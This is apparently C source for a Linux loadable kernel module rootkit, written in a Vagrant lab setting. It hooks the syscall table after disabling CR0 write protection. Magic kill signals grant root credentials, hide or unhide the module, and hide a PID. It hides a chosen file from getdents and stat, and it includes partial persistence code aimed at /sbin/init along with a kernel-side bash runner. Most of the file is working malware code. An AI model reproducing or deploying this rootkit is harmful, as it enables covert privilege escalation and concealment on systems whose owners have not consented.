#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/syscalls.h>
#include <linux/cred.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/namei.h>

#include "modify_syscalls.h"

#define DISABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_disable(); \
        write_cr0(read_cr0() & (~ 0x10000)); \
    } while (0);
#define ENABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_enable(); \
        write_cr0(read_cr0() | 0x10000); \
    } while (0);

#define START_ADDRESS 0xffffffff81000000
#define END_ADDRESS 0xffffffffa2000000
#define SYS_CALL_NUM 300

#define SIG_GIVE_ROOT 32
#define SIG_HIDE 33
#define SIG_UNHIDE 34
#define SIG_HIDEPID 35

// this is the filename we want to hide
// used in hacked_getdents(...)
#define TO_HIDE "test_file.txt"
char hidePID[6] = "-1";

// this is the c file which will replace /sbin/init
// - it loads the rootkit then runs the original /sbin/init
#define FILE_INIT_REPLACEMENT_C "start_rootkit.c"
// #define FILE_INIT               "/sbin/init"
// #define FILE_INIT_ORIGINAL      "/sbin/init_original"

#define FILE_INIT               "/vagrant/init_temp"
#define FILE_INIT_ORIGINAL      "/vagrant/init_temp_original"

asmlinkage int (*original_sysinfo)(struct sysinfo *);
asmlinkage int (*original_kill)(pid_t, int);
asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage int (*original_stat)(const char *path, struct stat *buf);
asmlinkage int (*original_lstat)(const char *path, struct stat *buf);

struct list_head *module_list;


void update_sys_calls(void **sys_call_table){
    void **modified_at_address_sysinfo = &sys_call_table[__NR_sysinfo];
    void *modified_function_sysinfo = hacked_sysinfo;
    void **modified_at_address_kill = &sys_call_table[__NR_kill];
    void *modified_function_kill = hacked_kill;
    void **modified_at_address_getdents = &sys_call_table[__NR_getdents];
    void *modified_function_getdents = hacked_getdents;
    void **modified_at_address_stat = &sys_call_table[__NR_stat];
    void *modified_function_stat = hacked_stat;
    void **modified_at_address_lstat = &sys_call_table[__NR_lstat];
    void *modified_function_lstat = hacked_lstat;

    DISABLE_W_PROTECTED_MEMORY
    original_sysinfo = xchg(modified_at_address_sysinfo, modified_function_sysinfo);
    original_kill = xchg(modified_at_address_kill, modified_function_kill);
    original_getdents = xchg(modified_at_address_getdents, modified_function_getdents);
    original_stat = xchg(modified_at_address_stat, modified_function_stat);
    original_lstat = xchg(modified_at_address_lstat, modified_function_lstat);
    ENABLE_W_PROTECTED_MEMORY
}

void revert_to_original(void **sys_call_table){
    void **modified_at_address_sysinfo = &sys_call_table[__NR_sysinfo];
    void *modified_function_sysinfo = original_sysinfo;
    void **modified_at_address_kill = &sys_call_table[__NR_kill];
    void *modified_function_kill = original_kill;
    void **modified_at_address_getdents = &sys_call_table[__NR_getdents];
    void *modified_function_getdents = original_getdents;
    void **modified_at_address_stat = &sys_call_table[__NR_stat];
    void *modified_function_stat = original_stat;
    void **modified_at_address_lstat = &sys_call_table[__NR_lstat];
    void *modified_function_lstat = original_lstat;

    DISABLE_W_PROTECTED_MEMORY
    original_sysinfo = xchg(modified_at_address_sysinfo, modified_function_sysinfo);
    original_kill = xchg(modified_at_address_kill, modified_function_kill);
    original_getdents = xchg(modified_at_address_getdents, modified_function_getdents);
    original_stat = xchg(modified_at_address_stat, modified_function_stat);
    original_lstat = xchg(modified_at_address_lstat, modified_function_lstat);
    ENABLE_W_PROTECTED_MEMORY
}

asmlinkage int hacked_sysinfo(struct sysinfo *info)
{
    original_sysinfo(info);
    info->uptime = 0;
    pr_info("System information modified!\n");
    return 0;
}

asmlinkage int hacked_kill(pid_t pid, int sig)
{
    struct task_struct *task;

    switch(sig) {
        case SIG_GIVE_ROOT:
            give_root();
            pr_info("Root priviledge given!\n");
            break;
        case SIG_HIDE:
            pr_info("Hiding the module!\n");
            hide();
            break;
        case SIG_UNHIDE:
            pr_info("Unhiding the module!\n");
            unhide();
            break;
        case SIG_HIDEPID:
            pr_info("Hiding the PID %d,\n",pid);
            sprintf(hidePID, "%d", pid);
            break;
        default:
            return original_kill(pid, sig);
    }
    return 0;
}

// code heavily inspired by:
// https://exploit.ph/linux-kernel-hacking/2014/07/10/system-call-hooking/
asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
    // run the actual system call
    // (this returns the number of bytes read)
    int ret = original_getdents(fd, dirp, count);

    // loop through the returned struct
    struct linux_dirent *cur = dirp;
    int i = 0;
    while (i < ret) {
        // if we see the filename which we want to hide,
        // then modify the number of bytes read
        // & move on
        if (strncmp(cur->d_name, TO_HIDE, strlen(TO_HIDE)) == 0 || strncmp(cur->d_name, hidePID, strlen(hidePID)) == 0) {
            // length of the linux_dirent
            int reclen = cur->d_reclen;
            // calc. the next file/directory location
            char* next_rec = (char*) cur + reclen;

            //      = end location of our directory - next file/directory location
            long len = (long) dirp + ret - (long) next_rec;
            // move onto the next directory/file
            // (this copies bytes from next_rec into cur)
            memmove(cur, next_rec, len);
            // update our return value so it isn't suspicious
            ret -= reclen;
        } else {
            // we don't match -
            // move on to the next directory/file
            i += cur->d_reclen;
            cur = (struct linux_dirent*) ((char*) dirp + i);
        }
    }

    return ret;
}

// given a filename w/ path, replaces with just filename
// returns string w/o path
const char* strip_filepath(const char* filepath) {
    const char* loc = strrchr(filepath, '/');
    if (loc == NULL) {
        // there is no path - only a filename
        return filepath;
    } else {
        return loc + sizeof(char);
    }
}

// code heavily inspired by:
// https://exploit.ph/linux-kernel-hacking/2014/10/23/rootkit-for-hiding-files/index.html
// NOTE: this does not append 'No such file or directory' to the end;
// is the error code return working?
asmlinkage int hacked_stat(const char *path, struct stat *buf) {
    const char* filename = strip_filepath(path);
    if (strncmp(filename, TO_HIDE, strlen(TO_HIDE)) == 0) {
        return -ENOENT;
    } else {
        return original_stat(path, buf);
    }
}

asmlinkage int hacked_lstat(const char *path, struct stat *buf) {
    const char* filename = strip_filepath(path);
    if (strncmp(filename, TO_HIDE, strlen(TO_HIDE)) == 0) {
        return -ENOENT;
    } else {
        return original_lstat(path, buf);
    }
}

void give_root(void)
{
    struct cred *newcreds;
    newcreds = prepare_creds();
    if (newcreds == NULL)
    	return;
    newcreds->uid = newcreds->gid = 0;
    newcreds->euid = newcreds->egid = 0;
    newcreds->suid = newcreds->sgid = 0;
    newcreds->fsuid = newcreds->fsgid = 0;
 
    commit_creds(newcreds);
}

void hide(void)
{
    module_list = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void unhide(void)
{
    list_add(&THIS_MODULE->list, module_list);
}

void **find_syscall_table(void)
{
    void **sctable;
    void *i = (void*) START_ADDRESS;

    while (i < (void*)END_ADDRESS) {
        sctable = (void **) i;
        // sadly only sys_close seems to be exported -- we can't check against more system calls
        if (sctable[__NR_close] == (void *) sys_close) {
        size_t j;
        // sanity check: no function pointer in the system call table should be NULL
        for (j = 0; j < SYS_CALL_NUM; j ++) {
            if (sctable[j] == NULL) {
                goto skip;
            }
        }
        return sctable;
        }
        skip:
        i += sizeof(void *);
    }

    return NULL;
}

// ref: https://www.linuxjournal.com/article/8110
//      https://en.it1352.com/article/bd12740c86574c22aff0e5b2b89680e4.html
// could have done this with function pointers? using lower level stuff tho
// you should delete the new file before calling this (if it already exists)
int clone_file(const char* filename_old, const char* filename_new) {
    int err;
    ssize_t ret_old = 0, ret_new = 0;
    unsigned char buf[1];
    struct file *filp_old   = NULL;
    struct file *filp_new = NULL;
    loff_t pos_read;
    loff_t pos_write;
    loff_t end;
    int i;

    // go into userspace
    mm_segment_t old_fs = get_fs();
    set_fs(get_ds());

    // open first file for reading
    filp_old = filp_open(filename_old, O_RDONLY, 0);
    if (IS_ERR(filp_old)) {
        err = PTR_ERR(filp_old);
        return 0;
    }

    // open second file for writing
    filp_new = filp_open(filename_new, O_WRONLY | O_CREAT, 0);
    if (IS_ERR(filp_new)) {
        err = PTR_ERR(filp_new);
        return 0;
    }

    // we need to reset the pos after seeking the end
    pos_read  = filp_old->f_pos;
    pos_write = filp_new->f_pos;
    end = vfs_llseek(filp_old, 0, SEEK_END);
    filp_old->f_pos = pos_read;

    // clone all bytes
    for (i = 0; i < end; i++) {
        ret_old = vfs_read(filp_old, buf, 1, &pos_read);    
        ret_new = vfs_write(filp_new, buf, 1, &pos_write);
    }

    // reset file positions
    if (ret_old > 0) { filp_old->f_pos = pos_read; }
    if (ret_new > 0) { filp_new->f_pos = pos_write; }

    filp_close(filp_new, NULL);
    filp_close(filp_old, NULL);

    // return to kernel space
    set_fs(old_fs);

    return 1;
}

// renames a file. creates if it doesn't exist - overwrites if it already does
int rename_file(const char* filename_old, const char* filename_new) {
    int err;
    ssize_t ret;
    struct file *filp_old = NULL;
    struct file *filp_new = NULL;
    struct inode*  old_dir;
    struct dentry* old_dentry;
    struct inode*  new_dir;
    struct dentry* new_dentry;

    // use user file system
    mm_segment_t old_fs = get_fs();
    set_fs(get_ds());

    // open old file for reading
    filp_old = filp_open(filename_old, O_RDONLY, 0);
    if (IS_ERR(filp_old)) {
        err = PTR_ERR(filp_old);
        return 0;
    }

    // open new file for writing
    filp_new = filp_open(filename_new, O_WRONLY | O_CREAT, 0);
    if (IS_ERR(filp_new)) {
        err = PTR_ERR(filp_new);
        return 0;
    }

    old_dir    = (filp_old->f_dentry->d_parent)->d_inode;
    old_dentry = filp_old->f_dentry;
    new_dir    = (filp_new->f_dentry->d_parent)->d_inode;
    new_dentry = filp_new->f_dentry;

    // use mutex?
    // lock_rename(filp_old->f_dentry, filp_new->f_dentry);
    ret = vfs_rename(old_dir, old_dentry, new_dir, new_dentry);
    // unlock_rename(filp_old->f_dentry, filp_new->f_dentry);

    // close both files
    filp_close(filp_new, NULL);
    filp_close(filp_old, NULL);

    // close old file system
    set_fs(old_fs);

    return ret;
}

umode_t get_file_permissions(const char* filename) {
    struct kstat file_stat;
     vfs_stat("/home/vagrant/start_rootkit", &file_stat);
    // printk("st_mode mod: %o\n", file_stat.mode & 0x0FFF);
    return file_stat.mode & 0x0FFF;
}

// runs a bash command
int run_bash(char* command) {
    int res;
    char* argv[4];
    char* envp[4];

    argv[0] = "bin/bash";
    argv[1] = "-c";
    argv[2] = command;
    argv[3] = NULL;

    envp[0] = "HOME=/";
    envp[1] = "TERM=linux";
    envp[2] = "PATH=/sbin:/usr/sbin:/bin:/usr/bin";
    envp[3] = NULL;

    res = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    return res;
}

// could have just placed this in lib/modules/<kernel_ver>/default,
// but this is more interesting!
// most of this should only be executed on the first
// run (ideally)
// - should this be done in our payload instead?
//   doing file I/O is bad in kernel modules
void add_to_reboot(void **sys_call_table) {
    //clone_file("/home/vagrant/dog.txt", "/home/vagrant/dog_copy.txt");
    clone_file("/home/vagrant/start_rootkit", "/home/vagrant/start_rootkit_copy");

    rename_file("/home/vagrant/rename_me.txt", "/home/vagrant/rename_me_ok_then.txt");

    // check for existence of /sbin/init_original
    // if (!access(FILE_INIT_ORIGINAL, R_OK) == 0) {
        // no  -> copy /sbin/init -> /sbin/init_original
        
        // char copy_command[4 + strlen(FILE_INIT) + strlen(FILE_INIT_ORIGINAL)];
        // sprintf(copy_command, "cp %s %s", FILE_INIT, FILE_INIT_ORIGINAL);
        // int return_copy = system(copy_command);
        
        //     -> compile start_rootkit.c -> /sbin/init
        // char compile_command[8 + strlen(FILE_INIT_REPLACEMENT_C) + strlen(FILE_INIT)];
        // sprintf(compile_command, "gcc %s -o %s", FILE_INIT_REPLACEMENT_C, FILE_INIT);

        //     -> move our replacement init -> /sbin/init

    // }

    // delete file if it exists ?

    // keep file permissions ?
    //sys_chmod("/home/vagrant/start_rootkit_copy", 0);
    //use sys_stat to get original file perms
    // sys_access("/home/avgrant/start_rootkit")

    //void* f_stat  = sys_call_table[__NR_stat];
    //asmlinkage int (*f_stat)(const char *path, struct stat *buf) = &sys_call_table[__NR_stat];
    //asmlinkage int (*f_chmod)(const char *pathname, mode_t mode) = &sys_call_table[__NR_chmod];

    // struct stat f1_stat;
    // DISABLE_W_PROTECTED_MEMORY
    // // original_stat("/home/vagrant/start_rootkit", &f1_stat);
    // // original_chmod("/home/vagrant/start_rootkit_copy", f1_stat.st_mode);

    // // dst, src, size
    // char* loc = "/home/vagrant/start_rootkit_copy";
    // char* user_loc;
    // copy_to_user(user_loc, loc, strlen(loc));
    // original_chmod(user_loc, 5);

    // ENABLE_W_PROTECTED_MEMORY

    // char* argv[4];
    // argv[0] = "bin/bash";
    // argv[1] = "-c";
    // argv[2] = "chmod 5 /home/vagrant/start_rootkit_copy > /home/vagrant/output.txt";
    // argv[3] = NULL;
    // // argv[0] = "bin/bash";
    // // argv[1] = "-c";
    // // argv[2] = "touch /home/vagrant/will_i_make_this >> /home/vagrant/output.txt";
    // // argv[3] = NULL;
    // char* envp[4];
    // envp[0] = "HOME=/";
    // envp[1] = "TERM=linux";
    // envp[2] = "PATH=/sbin:/usr/sbin:/bin:/usr/bin";
    // envp[3] = NULL;
    // int res = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);

    int res = run_bash("chmod 5 /home/vagrant/start_rootkit_copy");
    printk("result from chmod: %d", res);

    printk(": %d", res);
}